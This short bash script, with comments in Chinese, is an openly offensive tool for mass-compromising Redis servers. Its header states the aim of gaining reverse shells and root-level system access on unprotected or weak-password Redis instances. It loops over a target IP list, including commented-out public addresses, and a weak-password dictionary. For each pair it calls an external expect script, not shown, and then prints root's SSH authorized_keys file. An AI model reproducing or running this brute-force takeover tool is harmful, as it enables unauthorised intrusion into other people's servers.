#!/bin/bash
##create by xingcheng
##20180403
##function 批量redis反弹shell获取系统权限,主要针对没有安全策略的reids服务器和弱口令redis服务器，他们往往使用root账户运行

#ip_list=(39.106.107.229 123.206.31.161 127.0.0.1)
#password_dict=(123456 abcdef 234rdffs)
ip_list=(127.0.0.1 192.168.0.1) #ip列表数组，可以批量存入ip
password_dict=(123456 abcdefg 1qaz2wsx) #弱口令数组


password(){
for passwd in ${password_dict[@]}
do
  expect shell_rebound.exp "$ip" "$passwd"
  echo $(cat /root/.ssh/authorized_keys)
done

}




ip(){
for ip in ${ip_list[@]}
do
  password
done
}

ip
